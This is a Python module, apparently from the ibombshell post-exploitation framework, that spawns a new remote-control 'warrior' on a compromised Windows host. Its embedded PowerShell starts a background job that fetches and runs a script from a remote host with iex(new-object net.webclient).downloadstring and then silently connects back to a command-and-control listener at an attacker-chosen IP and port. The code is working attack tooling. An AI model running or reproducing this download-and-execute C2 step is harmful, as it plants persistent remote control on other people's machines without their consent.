from termcolor import colored, cprint
from warrior_check import exist_warrior
from module import Module


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "Inject Warrior",
                       "Description": "Create a new warrior in your system. Start-Job way!",
                       "Author": "@pablogonzalezpe"}

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                    "ip": [None,"IP or domain listener ibombshell",True],
                    "port": ["8080","Port listener ibombshell",False],
                    "code": [None,"Resource for c2 of ibombshell",False]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        if exist_warrior(self.args["warrior"]):
            function = """function createwarrior{
                param(
                    [String] $ip,
                    [String] $port,
                    [String] $code
                )
                if($port){
                    $url2 = "http://" + $ip + ":" + $port + "$code"
                }
                else
                {
                    $url2 = "http://" + $ip + "$code"
                }
                $url = "http://10.0.0.1/ibombshell"
                start-job -scriptblock {param($url,$url2) iex(new-object net.webclient).downloadstring("$url"); console -silently -uriConsole "$url2"} -ArgumentList $url,$url2
                
}

"""
            if self.args["code"]:
                function += 'createwarrior -ip "{}" -code "{}" -port "{}"'.format(self.args["ip"],self.args["code"],self.args["port"])
            else:
                function += 'createwarrior -ip "{}" -port "{}"'.format(self.args["ip"],self.args["port"])

            

            # TODO: Reemplazar la escritura por añadido (append)
            with open('/tmp/ibs-{}'.format(self.args["warrior"]), 'a') as f:
                # f.write(routeId)
                f.write(function)

            cprint ('[+] Done!', 'green')

        else:
            cprint ('[!] Failed... Warrior don´t found', 'red')
